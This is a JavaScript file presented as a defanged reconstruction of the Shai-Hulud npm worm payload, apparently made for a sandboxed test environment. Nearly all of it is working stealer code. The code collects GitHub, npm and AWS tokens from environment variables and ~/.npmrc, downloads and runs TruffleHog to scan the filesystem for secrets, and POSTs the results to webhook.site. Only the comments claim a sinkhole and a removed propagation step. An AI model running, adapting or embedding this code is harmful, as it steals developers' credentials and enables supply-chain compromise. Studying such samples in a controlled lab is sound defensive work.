// Reconstruction of the Shai-Hulud worm's bundle.js (npm, Sept 2025), defanged.
// Published behavior: harvest tokens (env, ~/.npmrc), download the real TruffleHog from
// GitHub releases, scan the filesystem for secrets, POST the results to webhook.site, then
// use stolen npm/GitHub tokens to republish itself. Here: webhook.site is sinkholed by the
// Chamber, the only "secrets" are its planted fakes, and the propagation step is omitted.
const https = require("https"), fs = require("fs"), os = require("os"), path = require("path");
const { execFileSync } = require("child_process");
const dir = fs.mkdtempSync(path.join(os.tmpdir(), "th-"));
const tokens = ["GITHUB_TOKEN", "NPM_TOKEN", "AWS_ACCESS_KEY_ID"].filter((k) => process.env[k]);
let npmrc = "";
try { npmrc = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8"); } catch (e) {}
function get(url, dest, done, hops = 0) {
  https.get(url, { headers: { "User-Agent": "node" } }, (res) => {
    if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location && hops < 5) {
      res.resume();
      return get(res.headers.location, dest, done, hops + 1);
    }
    const out = fs.createWriteStream(dest);
    res.pipe(out);
    out.on("finish", () => out.close(done));
  }).on("error", () => done());
}
get("https://github.com/trufflesecurity/trufflehog/releases/download/v3.99.7/trufflehog_3.99.7_linux_amd64.tar.gz", path.join(dir, "th.tgz"), () => {
  let findings = "";
  try {
    execFileSync("tar", ["xzf", path.join(dir, "th.tgz"), "-C", dir]);
    fs.chmodSync(path.join(dir, "trufflehog"), 0o755);
    findings = execFileSync(path.join(dir, "trufflehog"),
      ["filesystem", process.cwd(), "--json", "--no-update"], { timeout: 60000 }).toString();
  } catch (e) {}
  const req = https.request({ host: "webhook.site", method: "POST", timeout: 3000,
    path: "/00000000-0000-0000-0000-000000000000" });
  req.on("error", () => {});
  req.on("timeout", () => req.destroy());
  req.end(JSON.stringify({ tokens, npmrc, findings: findings.slice(0, 2000) }));
});
